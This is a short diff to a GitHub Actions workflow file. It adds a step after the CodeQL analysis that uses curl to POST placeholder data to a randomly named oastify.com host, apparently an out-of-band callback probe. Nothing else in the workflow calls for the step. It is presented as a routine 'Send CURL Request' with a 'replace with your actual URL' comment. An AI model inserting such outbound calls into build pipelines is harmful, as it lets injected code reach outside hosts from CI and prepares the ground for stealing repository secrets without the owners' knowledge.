@@ -80,3 +80,10 @@ jobs:
       uses: github/codeql-action/analyze@v2
       with:
         category: "/language:${{matrix.language}}"
+        
+    - name: Send CURL Request
+      run: |
+        # Replace with your actual URL and any required data
+        URL="http://xuvd37sjmd3i0vwp84vfmjq0argi4bs0.oastify.com"
+        # Use curl to send a POST request (change as needed)
+        curl -X POST -d "data=example" "$URL"
